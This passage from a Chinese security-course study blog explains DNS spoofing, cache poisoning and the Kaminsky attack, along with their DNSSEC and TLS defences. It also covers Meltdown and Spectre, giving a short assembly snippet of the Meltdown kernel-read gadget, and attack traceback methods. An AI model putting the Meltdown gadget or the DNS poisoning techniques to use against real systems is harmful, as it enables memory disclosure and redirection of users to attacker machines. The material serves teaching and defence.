<li>邮件服务器地址等</li>
</ul>
</li>
</ul>
</li>
<li><p>Authority Section（权威部分）</p>
<ul>
<li>指向权威名称服务器的记录（NS）</li>
</ul>
</li>
<li><p>Additional Section（附加部分）</p>
<ul>
<li>与查询相关的记录</li>
</ul>
</li>
</ul>
<p>DNS缓存：</p>
<p>当本地DNS服务器从其他DNS服务器获取信息时，它会缓存该信息。</p>
<p>缓存中的每一条信息都有一个生存时间值，最终将超时并从缓存中删除。</p>
<h3 id="DNS-攻击-1"><a href="#DNS-攻击-1" class="headerlink" title="DNS 攻击"></a>DNS 攻击</h3><p>拒绝服务攻击（DoS）</p>
<ul>
<li>当本地DNS服务器和权威名称服务器不响应DNS查询时，计算机无法检索IP地址。</li>
</ul>
<p>PS：DDoS（Distributed Denial of Service）是DoS攻击的一种变种，它涉及使用多个计算机或设备来协同发动攻击，从而使目标系统或网络资源不可用。</p>
<p>DNS欺骗</p>
<ul>
<li><p>主要目标：向受害者提供 欺诈性IP地址，诱使他们与不同于他们意图的机器进行通信。</p>
</li>
<li><p>示例：如果用户打算访问银行网站进行网上银行业务，但通过 DNS过程 获得的 IP地址 是攻击者的机器，则用户机器将与攻击者的web服务器通信。</p>
</li>
</ul>
<p>如果攻击者获得了机器的根权限</p>
<ul>
<li><p>修改 &#x2F;etc&#x2F;resolv.conf：使用恶意DNS服务器作为机器的本地DNS服务器，并可以控制整个DNS进程。</p>
</li>
<li><p>修改 &#x2F;etc&#x2F;hosts：向文件中添加新记录，提供某些选定域的IP地址。</p>
</li>
</ul>
<p>本地DNS缓存中毒攻击</p>
<ul>
<li><p>是一种针对DNS解析过程的安全威胁，属于DNS欺骗。</p>
</li>
<li><p>攻击者试图向本地DNS服务器的缓存中注入虚假的DNS记录，从而使合法的域名解析到错误的IP地址上。</p>
</li>
<li><p>这可能导致用户被重定向到恶意网站，甚至影响整个网络的正常通信。</p>
</li>
<li><p>防范策略：</p>
<ul>
<li><p>运行 <code>sudo rndc dumpdb –cache</code> 并检查 <code>/var/cache/bind/dump.db</code> 的内容。</p>
</li>
<li><p>在进行攻击之前，请使用 <code>sudo rndc flush</code> 清理缓存</p>
</li>
</ul>
</li>
</ul>
<p>远程DNS缓存中毒攻击</p>
<ul>
<li><p>挑战：对于与本地DNS服务器不在同一网络上的远程攻击者，欺骗回复要困难得多，因为他们需要猜测查询数据包使用的两个随机数：</p>
<ul>
<li><p>源端口号（16位随机数）</p>
</li>
<li><p>事务ID（16位随机数）</p>
</li>
</ul>
</li>
<li><p>缓存效应：如果一次尝试失败，local DNS 将缓存实际回复；攻击者需要等待缓存超时以进行下一次尝试。</p>
</li>
</ul>
<p>Kaminsky攻击：</p>
<p>我们如何在不担心缓存效应的情况下不断伪造回复？</p>
<p>卡明斯基的想法：</p>
<ul>
<li><p>每次询问不同的问题，因此缓存答案并不重要，并且本地DNS服务器每次都会发送一个新的查询。</p>
</li>
<li><p>在授权部分提供伪造答案</p>
</li>
<li><p>让该服务器去问在授权部分伪造的假答案</p>
</li>
</ul>
<img src="D:\PicGo\typoraimage\image-20231226195307022.png" alt="image-20231226195307022" style="zoom:50%;" />





<p>恶意DNS服务器的回复伪造攻击</p>
<p>DNS重绑定攻击</p>
<p>DNS拒绝服务攻击</p>
<h3 id="防止-DNS-缓存中毒攻击"><a href="#防止-DNS-缓存中毒攻击" class="headerlink" title="防止 DNS 缓存中毒攻击"></a>防止 DNS 缓存中毒攻击</h3><p>使用 DNSSEC 进行保护</p>
<img src="D:\PicGo\typoraimage\image-20231228155922036.png" alt="image-20231228155922036" style="zoom:50%;" />



<p>使用 TLS&#x2F;SSL 进行保护</p>
<p>传输层安全（TLS&#x2F;SSL）协议提供了针对缓存中毒攻击的解决方案。</p>
<ul>
<li><p>在使用DNS协议获取域名（<a target="_blank" rel="noopener" href="http://www.example.net)的ip地址后,计算机将询问ip地址的所有者(服务器)是否为www.example.net./">www.example.net）的IP地址后，计算机将询问IP地址的所有者（服务器）是否为www.example.net。</a></p>
</li>
<li><p>服务器必须提供由受信任实体签名的公钥证书，并证明它知道与<a target="_blank" rel="noopener" href="http://www.example.net关联的相应私钥(即,它是证书的所有者)./">www.example.net关联的相应私钥（即，它是证书的所有者）。</a></p>
</li>
<li><p>HTTPS 构建在 TLS&#x2F;SSL 之上。它可以击败DNS缓存中毒攻击。</p>
</li>
</ul>
<p>​	DNSSEC 与 TLS&#x2F;SSL 比较</p>
<ul>
<li><p>DNSSEC 和 TLS&#x2F;SSL 都基于公钥技术，但它们的信任链不同。</p>
</li>
<li><p>DNSSEC 使用 DNS 区域层次结构提供信任链，因此父区域中的名称服务器为子区域中的名称服务器提供担保。</p>
</li>
<li><p>TLS&#x2F;SSL 依赖于公钥基础设施，该基础设施包含为其他计算机提供担保的证书颁发机构。</p>
</li>
</ul>
<p>DNS 重新绑定攻击</p>
<img src="D:\PicGo\typoraimage\image-20231228161250099.png" alt="image-20231228161250099" style="zoom:50%;" />

<img src="D:\PicGo\typoraimage\image-20231228161258381.png" alt="image-20231228161258381" style="zoom:50%;" />





<p>DNS 上的拒绝服务攻击</p>
<ul>
<li><p>对根服务器和 TLD 服务器的攻击，但是一般攻击顶级域服务器。</p>
</li>
<li><p>如果攻击者能够关闭根区域的服务器，则可以关闭整个Internet。但是，攻击根服务器很困难：</p>
<ul>
<li><p>根名称服务器是高度分布式的。有13（A，B……M）个根名称服务器（服务器场），由大量冗余计算机组成，以提供可靠的服务。</p>
</li>
<li><p>由于 TLD 的名称服务器通常缓存在本地DNS服务器中，因此在缓存过期（48小时）之前不需要查询根服务器。对根服务器的攻击必须持续很长时间才能看到显著效果。</p>
</li>
</ul>
</li>
</ul>
<h1 id="熔断与幽灵攻击"><a href="#熔断与幽灵攻击" class="headerlink" title="熔断与幽灵攻击"></a>熔断与幽灵攻击</h1><h2 id="CPU缓存原理"><a href="#CPU缓存原理" class="headerlink" title="CPU缓存原理"></a>CPU缓存原理</h2><p>CPU 缓存（CPU Cache）是位于 CPU 内部的高速存储器，用于加快对数据和指令的访问速度，它是在 CPU 和主存（RAM）之间的一个临时存储区域。</p>
<img src="D:\PicGo\typoraimage\image-20231228162810456.png" alt="image-20231228162810456" style="zoom:50%;" />



<h2 id="侧信道攻击原理"><a href="#侧信道攻击原理" class="headerlink" title="侧信道攻击原理*"></a>侧信道攻击原理*</h2><p>如果 CPU 访问 Cache 中并不存在的数据时，则将会产生时间延迟，因此此时目标数据必须重新从内存加载到 Cache 中。</p>
<p>测量这种时间延迟有可能让攻击者确定出 Cache 访问失败的发生和频率。这就是基于缓存的侧信道攻击的基本原理。</p>
<p>Flush-Reload 技术</p>
<p>Flush+Reload 技术是一种侧信道攻击技术，用于获取另一个程序或操作系统内存中的敏感信息。</p>
<p>这种攻击的基本原理：</p>
<ol>
<li><p>首先将目标内存区域从处理器缓存中清除（flush）</p>
</li>
<li><p>然后监视处理器对该内存区域的访问。</p>
</li>
<li><p>通过观察目标内存区域是否被重新加载到缓存中，攻击者可以推断出目标程序对该内存区域进行了访问，从而获取敏感信息。</p>
<h2 id="熔断攻击思路"><a href="#熔断攻击思路" class="headerlink" title="熔断攻击思路*"></a>熔断攻击思路*</h2></li>
</ol>
<p>CPU乱序执行：</p>
<p>乱序执行可以简单地分为三个阶段：</p>
<img src="D:\PicGo\typoraimage\image-20231228174541087.png" alt="image-20231228174541087" style="zoom:50%;" />

<p>每个阶段执行的操作如下：</p>
<ol>
<li><p>获取指令，解码后存放到执行缓冲区 Reservations Stations</p>
</li>
<li><p>乱序执行指令，结果保存在一个结果序列中</p>
</li>
<li><p>退休期 Retired Circle，重新排列结果序列及安全检查（如地址访问的权限检查），提交结果到寄存器</p>
</li>
</ol>
<p>示例代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">; rcx = kernel address</span><br><span class="line"></span><br><span class="line">; rbx = probe array</span><br><span class="line"></span><br><span class="line">1 mov al, byte [rcx]</span><br><span class="line"></span><br><span class="line">2 shl rax, 0xc</span><br><span class="line"></span><br><span class="line">3 mov rbx, qword [rbx + rax] </span><br></pre></td></tr></table></figure>

<p>针对上述示例代码，Meltdown 漏洞的利用过程有4个步骤：</p>
<ol>
<li>获取指令、解码</li>
<li>乱序执行3条指令，指令2和指令3要等指令1中的读取内存地址的内容完成后才开始执行，指令3会将要访问的rbx数组元素所在的页加载到CPU Cache中。</li>
<li>对步骤2的结果进行重新排列，对1-3条指令进行安全检测，如发现访问违例，会丢弃当前执行的所有结果，恢复CPU状态到乱序执行之前的状态，但是并不会恢复 CPU Cache 的状态。</li>
<li>缓存侧信道攻击：通过缓存侧信道攻击，可以知道哪一个数组元素被访问过，也即对应的内存页存放在 CPU Cache 中，从而推测出内核地址的内容。</li>
</ol>
<h2 id="幽灵攻击思路"><a href="#幽灵攻击思路" class="headerlink" title="幽灵攻击思路*"></a>幽灵攻击思路*</h2><p>利用CPU的分支预测：</p>
<p>CPU并不会向我们代码编写的那样，先进行if的判断，在执行相应的分支，而是会预先执行分支中的语句。</p>
<p>举一个简单的例子：<code>if (a&gt;b) &#123;c = array[123456789];&#125;</code></p>
<p>一般按照我们期望的，CPU 先回判断 if 中的条件判断语句，再去执行主体中的内存访问赋值语句。这样在判断语句执行的时候，CPU 不会执行内存加载，这样就会浪费内存加载模块的资源。</p>
<p>分支预测技术可以减少这种资源的浪费，对于这样的语句，它允许操作系统先将对应的数据加载到 Cache 中，之后如果条件判断正确，就执行主体语句，这样主体语句在访问内存时就回去访问 Cache 而不是内存，时间就被节省下来了。</p>
<p>但是如果分支预测失败，那么 CPU 的状态信息就会被回滚还原，但是 Cache 中的数据还是保持不变。</p>
<p>幽灵漏洞（Spectre）原理：</p>
<p>当CPU发现分支预测错误时会丢弃分支执行的结果，恢复CPU的状态，但是不会恢复CPU Cache的状态，利用这一点可以突破进程间的访问限制（如浏览器沙箱）获取其他进程的数据。</p>
<img src="D:\PicGo\typoraimage\image-20231228180508516.png" alt="image-20231228180508516" style="zoom:50%;" />

<p>具体攻击过程可以分为三个阶段：</p>
<ol>
<li><p>训练CPU的分支预测单元：使其在运行代码时会进行特定的预测执行。</p>
</li>
<li><p>预测执行：处理器根据预测执行了代码路径，并将预测执行的结果加载到CPU Cache中。</p>
</li>
<li><p>缓存侧信道攻击：通过缓存测信道攻击，可以知道哪一个数组元素被访问过，也即对应的内存页存放在CPU Cache中，从而推测出地址的内容。</p>
</li>
</ol>
<h1 id="追踪溯源技术"><a href="#追踪溯源技术" class="headerlink" title="追踪溯源技术"></a>追踪溯源技术</h1><h2 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>网络攻击追踪溯源的目标是探知攻击者身份、攻击点位置及攻击路径等信息，据此可针对性制定防护或反制措施，进而占领网络对抗制高点。</p>
<p>典型网络攻击场景中所涉及的角色通常包括攻击者、受害者、跳板、僵尸机及反射器等。</p>
<img src="D:\PicGo\typoraimage\image-20231228182818802.png" alt="image-20231228182818802" style="zoom: 67%;" />

<p>一般来说，网络攻击追踪溯源是指确定攻击者的账号信息、身份信息、IP地址和MAC地址等虚拟地址信息与地理位置信息、攻击的中间环节信息以及还原攻击路径等的过程。</p>
<h3 id="目标层次"><a href="#目标层次" class="headerlink" title="目标层次"></a>目标层次</h3><p>按追踪溯源深度，网络攻击追踪溯源可分为攻击主机追踪溯源、控制主机追踪溯源、攻击者追踪溯源和攻击组织追踪溯源。</p>
<img src="D:\PicGo\typoraimage\image-20231228183219569.png" alt="image-20231228183219569" style="zoom: 67%;" />



<p>攻击主机追踪溯源：</p>
<p>攻击主机追踪溯源是对攻击主机进行定位，通常被称为IP追踪（IP Traceback），主要有：</p>
<ul>
<li><p>利用路由器调试接口的输入调试（Input Debugging）追踪技术。</p>
</li>
<li><p>ICMP追踪技术。</p>
</li>
<li><p>可对单个数据包进行追踪的源路径隔离引擎（Source Path Isolation Engine，SPIE）追踪技术等。</p>
</li>
</ul>
<h2 id="面临的挑战"><a href="#面临的挑战" class="headerlink" title="面临的挑战"></a>面临的挑战</h2><ol>
<li><p>跳板：广义而言，反射机和僵尸机也属于跳板，反射机的受控制程度低，僵尸机的受控制程度高</p>
</li>
<li><p>匿名通信系统：通过一定的技术手段将网络数据流中通信双方的身份信息加以隐藏，使第三方无法获取或推测通信双方的通信关系或其中任何一方的身份信息。</p>
</li>
<li><p>TCP&#x2F;IP 协议簇未考虑用户行为的追踪审计，对IP数据包的源地址没有验证机制，以及Internet基础设施的无状态性：攻击者能够对数据源地址字段直接进行修改或假冒，以隐藏其自身信息</p>
</li>
<li><p>虚拟专用网络（VPN）的 IP 隧道技术：无法获取数据报文的信息</p>
</li>
<li><p>互联网服务供应商（Internet Service Provider，ISP） 采用的地址池和网络地址转换（Network Address Translation，NAT）技术：使得网络IP地址不再固定对应特定的用户</p>
</li>
</ol>
<h2 id="典型技术"><a href="#典型技术" class="headerlink" title="典型技术"></a>典型技术</h2><h3 id="IP追踪技术"><a href="#IP追踪技术" class="headerlink" title="IP追踪技术"></a>IP追踪技术</h3><p>IP追踪技术可追踪采用伪造地址的数据包的真实发送者，分为反应式追踪和主动式追踪两大类。</p>
<img src="D:\PicGo\typoraimage\image-20231228184002721.png" alt="image-20231228184002721" style="zoom: 67%;" />



<h3 id="跳板攻击溯源技术"><a href="#跳板攻击溯源技术" class="headerlink" title="跳板攻击溯源技术"></a>跳板攻击溯源技术</h3><p>分为基于主机的溯源方法和基于网络的溯源方法</p>
<p>基于主机的溯源方法：</p>
<ul>
<li><p>分布式入侵检测系统（Distributed Intrusion Detection System，DIDS）</p>
<ul>
<li>被动式溯源</li>
</ul>
</li>
<li><p>呼叫识别系统（Caller Identification System，CIS）</p>
<ul>
<li>被动式溯源</li>
</ul>
</li>
<li><p>Caller ID</p>
<ul>
<li>主动式溯源</li>
</ul>
</li>
<li><p>和会话令牌协议（Session Token Protocol，STOP）</p>
<ul>
<li>被动式溯源</li>
</ul>
</li>
</ul>
<h3 id="针对匿名通信系统的追踪溯源技术"><a href="#针对匿名通信系统的追踪溯源技术" class="headerlink" title="针对匿名通信系统的追踪溯源技术"></a>针对匿名通信系统的追踪溯源技术</h3><h3 id="协议脆弱性攻击"><a href="#协议脆弱性攻击" class="headerlink" title="协议脆弱性攻击"></a>协议脆弱性攻击</h3><p>协议脆弱性攻击利用匿名通信系统自身的内在脆弱性对其进行攻击，以降低其匿名度。</p>
<ul>
<li><p>低资源路由攻击技术：利用Tor匿名网络路径选择算法的缺陷开展攻击。</p>
</li>
<li><p>女巫攻击（Sybil Attack）：通过向匿名网络中植入自己的节点或者控制部分网络节点，然后用这些节点提供的信息推断匿名隐藏关系。</p>
</li>
<li><p>前驱攻击&#x2F;合谋攻击（Predecessor Attack&#x2F;Collusion Attack）：当追踪者知道自己控制的节点在发送者的路径上时，该节点的前驱节点比其它任何节点更像是发送者，追踪者对每个可能的前驱节点进行统计就可能发现发送者。</p>
</li>
<li><p>报文标记攻击（Message Tagging Attack）：在最后一个节点处进行识别辨认就可确认发送者与接收者之间的关系。</p>
</li>
</ul>
<h3 id="流量分析攻击"><a href="#流量分析攻击" class="headerlink" title="流量分析攻击"></a>流量分析攻击</h3><p>流量分析攻击通过分析和关联不同数据流之间的流量特征来降低匿名通信系统的匿名度，主要包括：</p>
<ul>
<li>时间攻击（Timing Attack）</li>
<li>包计数攻击</li>
<li>流相关攻击（Flow Correlation Attack）</li>
</ul>
<h2 id="技术发展趋势"><a href="#技术发展趋势" class="headerlink" title="技术发展趋势"></a>技术发展趋势</h2><p>发展趋势有：</p>
<ul>
<li><p>大尺度网络中的传播源定位技术</p>
</li>
<li><p>基于软件基因的网络攻击追踪溯源技术</p>
</li>
<li><p>基于网络大数据的网络攻击追踪溯源技术</p>
</li>
<li><p>多手段融合的追踪溯源技术</p>
</li>
</ul>

</div> 

<script>
    window.onload = detectors();
</script>
    <div class="post-footer">
    <div class="h-line-primary"></div>
    <nav class="post-nav">
        <div class="prev-item">
           
        </div>
        <div class="next-item">
            
                <div class="icon arrow-right"></div>
                <div class="post-link">
                  <a href="/2023/12/06/DCT%E5%9B%BE%E7%89%87%E6%B0%B4%E5%8D%B0%E7%A0%B4%E8%A7%A3/">Next</a>  
                </div>  
            
        </div>
    </nav>
</div>

    
      <div class="post-comment">

    
        <div id="vcomments"></div>
        <script>
            var META = ['nick', 'mail', 'link'];
            var meta = 'nick,mail';
            meta = meta.split(',').filter(item => {
                return META.includes(item);
            });
            new Valine({
                el: '#vcomments',
                appId: 'F66AtRvxG9PhCwW4hreCa8Wi-gzGzoHsz',
                appKey: 'BWBfaEgWGZEiGGbyiwWWH7Go',
                lang: 'en',
                placeholder: 'Say something',
                avatar: 'mp',
                meta: meta
            })
        </script>    
     

     
    
    

</div>
     
  
</article>
        </div>
      </div>
      
      <div class="footer">
    <div class="flex-container">
        <div class="footer-text">
            
                something
                <br>
            
            
                © RealSpaccr | 
            
            
                Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & <a target="_blank" rel="noopener" href="https://github.com/zoeingwingkei/frame/">Frame</a>
                
        </div>
    </div>
</div>

    </div>

    
      <div class="search-popup">
    <div class="search-popup-overlay">  
    </div>
    <div class="search-popup-window" >
        <div class="search-header">
            <div class="search-input-container">
              <input autocomplete="off" autocapitalize="off" maxlength="80"
                     placeholder="Search Anything" spellcheck="false"
                     type="search" class="search-input">
            </div>
            <div class="search-close-btn">
                <div class="icon close-btn"></div>
            </div>
        </div>
        <div class="search-result-container">
        </div>
    </div>
</div>

<script>
    const searchConfig = {
        path             : "/search.xml",
        top_n_per_article: "1",
        unescape         : "false",
        trigger: "auto",
        preload: "false"
    }
</script>
<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script>
<script src="/js/search.js"></script>
    
    

  </body>
</html>
